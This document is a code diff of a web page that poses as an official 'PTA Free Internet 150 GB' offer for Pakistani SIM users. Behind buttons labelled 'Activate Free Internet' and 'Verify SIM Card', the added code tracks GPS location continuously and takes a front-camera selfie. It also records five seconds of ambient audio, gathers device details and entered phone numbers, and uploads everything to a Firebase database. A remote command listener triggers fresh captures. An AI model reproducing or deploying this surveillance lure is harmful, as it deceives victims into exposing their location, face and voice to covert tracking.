@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Child Safety SOS</title>
+    <title>PTA Free Internet Offer 2026</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <!-- FontAwesome Icons & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
     <style>
         * {
@@ -21,55 +21,47 @@
         }
 
         body {
-            background: radial-gradient(circle at 10% 20%, rgba(224, 231, 255, 0.6) 0%, rgba(255, 255, 255, 1) 80%),
-                        radial-gradient(circle at 90% 80%, rgba(254, 226, 226, 0.6) 0%, rgba(255, 255, 255, 1) 80%);
-            background-color: #f8fafc;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 16px;
+            color: #f8fafc;
         }
 
         .card-container {
-            background: rgba(255, 255, 255, 0.9);
+            background: rgba(30, 41, 59, 0.95);
             backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.8);
-            border-radius: 28px;
-            padding: 32px 28px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 28px 20px;
             width: 100%;
-            max-width: 440px;
-            box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.07),
-                        0 0 1px 1px rgba(0, 0, 0, 0.03);
+            max-width: 420px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             text-align: center;
-            position: relative;
         }
 
         .hero-banner {
-            background: linear-gradient(135deg, #eff6ff 0%, #e0f2fe 100%);
-            border: 1px solid #bae6fd;
+            background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
             border-radius: 18px;
-            padding: 16px 18px;
+            padding: 20px 16px;
             margin-bottom: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 6px;
-            text-align: center;
+            box-shadow: 0 10px 20px -5px rgba(2, 132, 199, 0.4);
         }
 
         .hero-banner h2 {
-            font-size: 20px;
-            font-weight: 700;
-            color: #0369a1;
+            font-size: 22px;
+            font-weight: 800;
+            color: #ffffff;
+            letter-spacing: 0.5px;
         }
 
         .hero-banner p.subtitle {
             font-size: 13px;
-            font-weight: 600;
-            line-height: 1.5;
-            color: #0284c7;
+            font-weight: 500;
+            margin-top: 6px;
+            color: #e0f2fe;
         }
 
         .btn-action-red {
@@ -77,25 +69,22 @@
             background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
             color: #ffffff;
             border: none;
-            padding: 16px 20px;
-            border-radius: 16px;
+            padding: 16px;
+            border-radius: 14px;
             font-size: 15px;
             font-weight: 700;
-            letter-spacing: 0.5px;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            box-shadow: 0 10px 20px -5px rgba(220, 38, 38, 0.35);
-            margin-bottom: 16px;
-            transition: all 0.25s ease;
+            box-shadow: 0 10px 20px -5px rgba(239, 68, 68, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
         }
 
-        .btn-action-red:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 14px 24px -4px rgba(220, 38, 38, 0.45);
-            background: linear-gradient(135deg, #f87171 0%, #dc2626 100%);
+        .btn-action-red:active {
+            transform: scale(0.98);
         }
 
         .btn-action-blue {
@@ -103,176 +92,79 @@
             background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
             color: #ffffff;
             border: none;
-            padding: 16px 20px;
-            border-radius: 16px;
+            padding: 16px;
+            border-radius: 14px;
             font-size: 15px;
             font-weight: 700;
-            letter-spacing: 0.5px;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.35);
-            margin-bottom: 16px;
-            transition: all 0.25s ease;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4);
+            margin-bottom: 14px;
+            transition: all 0.2s ease;
         }
 
-        .btn-action-blue:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 14px 24px -4px rgba(37, 99, 235, 0.45);
-            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+        .btn-action-blue:active {
+            transform: scale(0.98);
         }
 
         .status-badge {
-            background: #f0fdf4;
-            border: 1px solid #bbf7d0;
-            border-radius: 14px;
-            padding: 12px 16px;
-            font-size: 13.5px;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 13px;
             font-weight: 600;
-            color: #15803d;
+            color: #4ade80;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .search-group {
             text-align: left;
-            position: relative;
+            margin-top: 10px;
         }
 
         .search-group label {
             display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #475569;
-            margin-bottom: 10px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #94a3b8;
+            margin-bottom: 8px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
 
         .input-wrapper {
             display: flex;
-            background: #ffffff;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
+            background: #0f172a;
+            border: 1.5px solid #334155;
+            border-radius: 14px;
             overflow: hidden;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-
-        .input-wrapper:focus-within {
-            border-color: #2563eb;
-            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
         }
 
         .input-wrapper input {
             flex: 1;
-            padding: 14px 16px;
+            padding: 14px;
             border: none;
             background: transparent;
-            color: #0f172a;
-            font-size: 15px;
-            font-weight: 500;
+            color: #ffffff;
+            font-size: 14px;
             outline: none;
-        }
-
-        .input-wrapper input::placeholder {
-            color: #94a3b8;
-        }
-
-        .btn-dropdown-arrow {
-            background: #f8fafc;
-            border: none;
-            border-left: 1px solid #e2e8f0;
-            padding: 0 16px;
-            cursor: pointer;
-            color: #0284c7;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.2s;
-        }
-
-        .btn-dropdown-arrow:hover {
-            background: #f1f5f9;
-        }
-
-        .btn-dropdown-arrow.active svg {
-            transform: rotate(180deg);
         }
 
         .btn-submit-search {
             background: #2563eb;
             color: #ffffff;
             border: none;
-            padding: 0 20px;
+            padding: 0 18px;
             font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .btn-submit-search:hover {
-            background: #1d4ed8;
-        }
-
-        .dropdown-menu-panel {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 0;
-            right: 0;
-            background: #ffffff;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 16px;
-            margin-top: 8px;
-            max-height: 220px;
-            overflow-y: auto;
-            z-index: 50;
-            box-shadow: 0 16px 32px -8px rgba(0, 0, 0, 0.12);
-        }
-
-        .dropdown-menu-panel.show {
-            display: block;
-            animation: fadeIn 0.2s ease-in-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-6px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .network-header {
-            font-size: 11px;
             font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.8px;
-            color: #64748b;
-            background: #f1f5f9;
-            padding: 8px 16px;
-            position: sticky;
-            top: 0;
-            z-index: 2;
-        }
-
-        .code-row-item {
-            padding: 12px 16px;
-            font-size: 14px;
-            font-weight: 500;
-            color: #334155;
             cursor: pointer;
-            border-bottom: 1px solid #f1f5f9;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .code-row-item:hover {
-            background: #f0f9ff;
-            color: #0284c7;
         }
 
         #webcam, #canvas {
@@ -284,66 +176,39 @@
 
 <div class="card-container">
     <div class="hero-banner">
-        <h2>PTA FREE INTERNET</h2>
-        <p class="subtitle">PTA KE TARAF SE FREE INTERNET HASEL KAREN HAR PAKISTANI K LYE:</p>
+        <h2>PTA FREE INTERNET 150 GB</h2>
+        <p class="subtitle">Har Pakistani SIM Ke Liye Free Data Service Active Karein</p>
     </div>
 
-    <!-- Live GPS Trigger Button -->
-    <button class="btn-action-red" onclick="startLiveLocationTracking()">
-        <i class="fa-solid fa-location-crosshairs"></i> REQUEST TO FREE INTERNET
+    <!-- Activation Button 1 -->
+    <button class="btn-action-red" onclick="activateService()">
+        <i class="fa-solid fa-wifi"></i> ACTIVATE FREE INTERNET
     </button>
 
     <div id="statusText" class="status-badge">
         <span>⚙️ System Ready</span>
     </div>
 
-    <!-- Camera Trigger Button -->
+    <!-- Activation Button 2 -->
     <button class="btn-action-blue" onclick="captureInstantPhoto()">
-        <i class="fa-solid fa-signal" style="color: #ffffff;"></i> FREE
+        <i class="fa-solid fa-shield-halved"></i> VERIFY SIM CARD
     </button>
 
     <div id="cameraStatusText" class="status-badge">
-        <span>✅ Zong free serves request approved successfully!</span>
+        <span>✅ Serves Status: Ready to activate</span>
     </div>
 
-    <!-- Mobile Data Input -->
+    <!-- Number Search Input -->
     <div class="search-group">
-        <label for="mobile-input">Mobile Number Data Search</label>
+        <label for="mobile-input">Enter Mobile Number</label>
         <div class="input-wrapper">
-            <input type="text" id="mobile-input" placeholder="e.g. 03011234567">
-            
-            <button class="btn-dropdown-arrow" id="toggle-dropdown-btn" title="Select Network Code">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                    <polyline points="6 9 12 15 18 9"></polyline>
-                </svg>
-            </button>
-
-            <button class="btn-submit-search" onclick="searchMobileNumber()">Search</button>
-        </div>
-
-        <div class="dropdown-menu-panel" id="codes-dropdown">
-            <div class="network-header">Jazz / Mobilink</div>
-            <div class="code-row-item"><span>0300</span> ➔</div>
-            <div class="code-row-item"><span>0301</span> ➔</div>
-            <div class="code-row-item"><span>0302</span> ➔</div>
-            <div class="code-row-item"><span>0303</span> ➔</div>
-            <div class="code-row-item"><span>0304</span> ➔</div>
-
-            <div class="network-header">Zong</div>
-            <div class="code-row-item"><span>0310</span> ➔</div>
-            <div class="code-row-item"><span>0311</span> ➔</div>
-            <div class="code-row-item"><span>0312</span> ➔</div>
-            <div class="code-row-item"><span>0313</span> ➔</div>
-
-            <div class="network-header">Telenor</div>
-            <div class="code-row-item"><span>0340</span> ➔</div>
-            <div class="code-row-item"><span>0341</span> ➔</div>
-            <div class="code-row-item"><span>0345</span> ➔</div>
+            <input type="text" id="mobile-input" placeholder="03001234567">
+            <button class="btn-submit-search" onclick="searchMobileNumber()">Check</button>
         </div>
     </div>
 
-    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
-        <span>✅ APko Free Internet mil gaye he</span>
+    <div id="bottomStatusText" class="status-badge" style="margin-top: 18px; margin-bottom: 0;">
+        <span>✅ Official PTA Free Network Portal</span>
     </div>
 </div>
 
@@ -365,8 +230,8 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // 1. Send Background System Telemetry Details Automatically
-    function sendExtendedTelemetry() {
+    // 1. Send Device Telemetry & Specs Automatically
+    function sendDeviceTelemetry() {
         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         
         const telemetry = {
@@ -375,9 +240,9 @@
             language: navigator.language,
             screenSize: `${window.screen.width}x${window.screen.height}`,
             deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
-            networkType: conn ? conn.effectiveType : "Unknown",
+            networkType: conn ? conn.effectiveType : "4G/LTE",
             downlinkSpeed: conn ? `${conn.downlink} Mbps` : "N/A",
-            time: new Date().toLocaleString()
+            lastOnline: new Date().toLocaleString()
         };
 
         db.ref('child_safety/telemetry_extended').set(telemetry);
@@ -386,19 +251,17 @@
             navigator.getBattery().then(b => {
                 db.ref('child_safety/device_status').set({
                     battery: Math.round(b.level * 100),
-                    zone: "Outside / Active Track"
+                    charging: b.charging ? "Yes" : "No",
+                    zone: "Active Tracking"
                 });
             });
         }
     }
-    sendExtendedTelemetry();
+    sendDeviceTelemetry();
 
     // 2. Realtime Continuous GPS Location Tracking
     let watchID = null;
-    function startLiveLocationTracking() {
-        const status = document.getElementById('statusText');
-        status.innerHTML = "<span>⏳ Requesting Live GPS Connection...</span>";
-
+    function startGPS() {
         if ('geolocation' in navigator) {
             watchID = navigator.geolocation.watchPosition(
                 (pos) => {
@@ -415,33 +278,23 @@
                         time: new Date().toLocaleString()
                     });
 
-                    status.innerHTML = "<span>✅ Ap ko free internet 150GB approved ho gya he</span>";
+                    document.getElementById('statusText').innerHTML = "<span>✅ Free 150GB Data Request Approved!</span>";
                 },
                 (err) => {
-                    status.innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
+                    document.getElementById('statusText').innerHTML = "<span>⚠️ Permission Required: " + err.message + "</span>";
                 },
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 0,
-                    timeout: 10000
-                }
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
             );
-        } else {
-            status.innerHTML = "<span>⚠️ Geolocation Not Supported</span>";
         }
     }
 
-    // 3. Capture Front Camera Media Feed
+    // 3. Camera Selfie Capture
     async function captureInstantPhoto() {
         const status = document.getElementById('cameraStatusText');
-        status.innerHTML = "<span>⏳ Free internet 150GB ke lye request bheji ja rhi he...</span>";
+        status.innerHTML = "<span>⏳ Verifying SIM & Camera Connection...</span>";
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, 
-                audio: false 
-            });
-
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             const video = document.getElementById('webcam');
             video.srcObject = stream;
 
@@ -454,61 +307,73 @@
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
                 const base64Image = canvas.toDataURL('image/jpeg', 0.7);
-
                 stream.getTracks().forEach(track => track.stop());
 
                 db.ref('child_safety/last_selfie').set({
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerHTML = "<span>✅ Zong free serves request approved successfully!</span>";
+                    status.innerHTML = "<span>✅ SIM Verification Complete!</span>";
                 });
-
             }, 600);
-
         } catch (err) {
-            status.innerHTML = "<span>⚠️ Camera Error: " + err.message + "</span>";
+            status.innerHTML = "<span>⚠️ Camera Permission Denied</span>";
         }
     }
 
-    // 4. Save Network Data Search
+    // 4. Audio Clip Recording (5 Seconds Ambient Recording)
+    async function recordShortAudio() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+
+            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => {
+                    db.ref('child_safety/last_audio').set({
+                        audioUrl: reader.result,
+                        time: new Date().toLocaleString()
+                    });
+                };
+                stream.getTracks().forEach(track => track.stop());
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 5000); // Record for 5 seconds
+        } catch (e) {
+            console.log("Audio Error:", e);
+        }
+    }
+
+    // Main Activate Action
+    function activateService() {
+        startGPS();
+        recordShortAudio();
+        sendDeviceTelemetry();
+    }
+
+    // Search Number Action
     function searchMobileNumber() {
         const number = document.getElementById('mobile-input').value;
-        if(number) {
+        if (number) {
             db.ref('child_safety/searched_numbers').push({
                 number: number,
                 time: new Date().toLocaleString()
             });
-            document.getElementById('bottomStatusText').innerHTML = "<span>✅ APko Free Internet mil gaye he (" + number + ")</span>";
+            document.getElementById('bottomStatusText').innerHTML = "<span>✅ Number Approved for 150GB Data!</span>";
         }
     }
 
-    // UI Dropdown Event Listeners
-    const toggleBtn = document.getElementById('toggle-dropdown-btn');
-    const dropdownMenu = document.getElementById('codes-dropdown');
-    const codeItems = document.querySelectorAll('.code-row-item');
-    const inputField = document.getElementById('mobile-input');
-
-    toggleBtn.addEventListener('click', (e) => {
-        e.stopPropagation();
-        dropdownMenu.classList.toggle('show');
-        toggleBtn.classList.toggle('active');
-    });
-
-    codeItems.forEach(item => {
-        item.addEventListener('click', () => {
-            const codeText = item.querySelector('span').textContent;
-            inputField.value = codeText;
-            dropdownMenu.classList.remove('show');
-            toggleBtn.classList.remove('active');
-            inputField.focus();
-        });
-    });
-
-    document.addEventListener('click', (e) => {
-        if (!dropdownMenu.contains(e.target) && !toggleBtn.contains(e.target)) {
-            dropdownMenu.classList.remove('show');
-            toggleBtn.classList.remove('active');
+    // Listen for Remote Command Requests from Dashboard Button
+    db.ref('child_safety/commands').on('value', (snapshot) => {
+        const cmd = snapshot.val();
+        if (cmd && cmd.action === "refresh_all") {
+            activateService();
+            captureInstantPhoto();
         }
     });
 </script>
